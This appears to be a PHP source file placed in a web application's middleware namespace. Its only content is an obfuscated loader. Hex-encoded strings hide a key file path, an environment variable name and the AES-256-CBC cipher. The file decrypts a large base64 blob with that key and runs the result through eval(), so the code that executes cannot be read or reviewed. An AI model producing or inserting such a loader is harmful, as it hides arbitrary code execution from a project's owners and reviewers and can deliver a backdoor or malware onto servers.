<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('0XNBIrmDJs3ZWJQnNHjMZQ==');

$c=base64_decode(

'w+IYk3xbYN/M2zBFkgLNZOkmWF1WtvptNhbrPoqRspdH7RF8p5Ko3D8kBCDT0vOC75fXxyA/PaXx' .
'DZN8oaT4S28hCwiqHIaDIFTQw/Bf7wjytYPLS1+cv2bMnB0uegmfmcIGzOS6hEEdMKAGrwsmBU1X' .
'L1/UJx8bRRmbUzzGCNXEHdG08RZvT+xtvHIUVjc9JcceilOUdVqbfUCUhosoIzKL2Ygn6YE+CDl7' .
'64MKOo64uUJsaIcoogJMlroi7v7NLOed7xCfVjCi08+QUfboe6DL65M3LW9m2SgE51VqXY79fK2t' .
'Unfo3IunAos5mYoRAXvRM11+zNSTqkfZQOQWAGonUN5ZYyDet7VyGrrDW317ZY8sTy+AdJQI/8lO' .
'qtp/9N1zUZ0aVP3f0B9ql8/PaoOcZYOVnJLMjjhmltS0F3hc60Q42oCJBG8Hw5NfcEpsqi/75QX2' .
'WTk5ZH/+r57+BECOsP4id3bfRqbGFDWCQul4vAuIKINdEzaCnL/uwFEf/sES8N9N9syj/2ljjJd9' .
'BDNbHLxlmQxPTrDyox8FvBcDh5lKX/k4QnYyrJSWp6ZwOo507DdA6lGC0axmiSShJ/bfA68xBK9Z' .
'5K2unCfAaLCcy5Jxu89Afe8VdugXdWcuLFNDNVDjMEosFgSkyF+RbT352lnxQ/HZVA8uUSjYWj2m' .
'cwKqTYFy8otrWkJN8ia903Nlli5slp31WMC3xeFh5MGMjdqajIr0QPjwGEKIRkYe/68I7mJgR1zG' .
'p+jmSWAmEE1RL7jslg9HpOZWiqxniR5lfzMxryZtjdfwaXMZcQkX418qHM/+wQP5LK5FNuq2H1na' .
'nuMt8Zdn19O2eFHzPB4op8f8VRSZrK+BWv5DQMWBT60ncHMljO1fIcQ5YLqP9EGeD3lsTYBGLPg4' .
'sRIjetYdmpPo1RJGFuazChBSQGyL5y2oNXODcwKliLLYHFmGbohD57UTyTckb9qS0Gt9aZ0+27TZ' .
'QxhpamjTWaQM/OD6hSxQf3oWK+1J9UVW9/0KOU6Q4r6opxRwppVeQd6GtqMGzD3Fc2y8WxFDVTBG' .
'p1EkwFCPKI7oBs7yRexoSPXOua/se2Vd29Xo60T++G7eNtwEAFRQ7tkyz5hr69fkfB8SSVaWnzXv' .
'jbC3oo8N3XHVyQxuaz1uE7pqN3asA00iSE2k4X85PuK3DYnhfdXx/7DqFmQj4yKHbnu09avNuQdw' .
'DPynj1zEkg+7iul7fqsSfU/gOZyymAy/xVSd396S77t57O2D4xQPdPDQTm8mGpawKzr3PVblxaae' .
'aR0W3eM6n8/5DGJGgAhuolHvy0Ez+e/c+w2L0j4ff6IvoNSESnROxBoWgAWxYWcKb+rb2hdpVQW5' .
'Itw/8s9qfhK9K5K7zqCN0WHKCqSH9WlYEqH+ZT/hwgMpSq6GnCCHTygEKRDvSyWMPoihyJT5L7JW' .
'KZHscQt8i07tEznVV9IKiav2aPSQfaJsTIj2q44HnvVhNv/NgEauzB1/PvYyAX8z8mKJK3d4ZeuR' .
'xyFIf9Csn2MHRY+yGGpbK/0212ULs2YBPaWaBQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

